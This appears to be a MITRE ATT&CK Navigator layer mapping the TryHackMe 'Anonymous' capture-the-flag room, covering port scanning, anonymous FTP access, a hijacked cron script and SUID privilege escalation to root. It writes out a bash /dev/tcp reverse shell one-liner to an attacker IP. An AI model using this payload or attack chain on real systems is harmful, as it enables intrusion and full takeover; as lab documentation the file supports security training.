name: Anonymous - TryHackMe Room
description: MITRE ATT&CK Navigator layer mapping for the Anonymous CTF challenge. Shows attack techniques used across reconnaissance, exploitation, and privilege escalation phases.

techniques.comment: Gather Victim Host Information - Port scanning and service enumeration
Gather Victim Host Information: Software - Service version enumeration (vsftpd 3.0.3, OpenSSH 7.6p1, Samba 4.7.6)
Gather Victim Host Information: Client Configurations - Discovered world-writable FTP directory structure

metadata.name: Discovery Method
metadata.value: FTP directory listing and permission enumeration

techniques.comment: Active Scanning - Port scanning and service detection
Active Scanning: Scanning IP Blocks - Nmap aggressive scan on target IP 10.201.29.134

metadata.name: Result
metadata.value: 4 open ports identified: FTP(21), SSH(22), NetBIOS(139,445)

techniques.comment: Active Scanning: Vulnerability Scanning - Service version enumeration for vulnerability assessment
Exploit Public-Facing Application - Anonymous FTP access enabled on vsftpd 3.0.3

metadata.name: Impact
metadata.value: Critical - Exposed scripts directory with world-writable permissions

metadata.name: Attack Vector
metadata.value: ftp 10.201.29.134 with 'ftp' user and blank password

techniques.comment: Scheduled Task/Job - Cron job execution mechanism for clean.sh script
Scheduled Task/Job: Cron - Malicious reverse shell executed via modified cron script

metadata.name: Exploitation Method
metadata.value: Replaced clean.sh with reverse shell payload: bash -i >& /dev/tcp/10.17.19.104/4444 0>&1

metadata.name: Result
metadata.value: Reverse shell obtained as 'namelessone' user on Netcat listener port 4444

techniques.comment: Scheduled Task/Job: Cron - Persistent backdoor via cron job modification

metadata.name: Persistence Mechanism
metadata.value: Modified world-writable script executed by cron daemon

metadata.name: Privilege Level
metadata.value: Executed with cron job owner privileges (namelessone)

techniques.comment: Scheduled Task/Job: Cron - Used as vector for code execution with elevated context

metadata.name: Elevation Source
metadata.value: World-writable script in cron execution path

techniques.comment: Ingress Tool Transfer - Reverse shell communication over TCP connection

metadata.name: Direction
metadata.value: Outbound from target to attacker's Netcat listener

techniques.comment: Abuse Elevation Control Mechanism - SUID binary exploitation for privilege escalation
Abuse Elevation Control Mechanism: Setuid and Setgid - Exploited /usr/bin/env SUID binary

metadata.name: Result
metadata.value: Root shell obtained; UID=0(root) privileges gained

techniques.comment: Abuse Elevation Control Mechanism: Setuid and Setgid - Used -p flag to preserve privileges

metadata.name: Defense Evasion Technique
metadata.value: Used -p flag in /bin/sh to maintain elevated privileges from SUID execution

metadata.name: Impact
metadata.value: Bypassed privilege restrictions to execute commands as root

metadata.name: Attack Chain
metadata.value: Reconnaissance -> Anonymous FTP Access -> Script Manipulation -> Reverse Shell -> SUID Exploitation -> Root Access
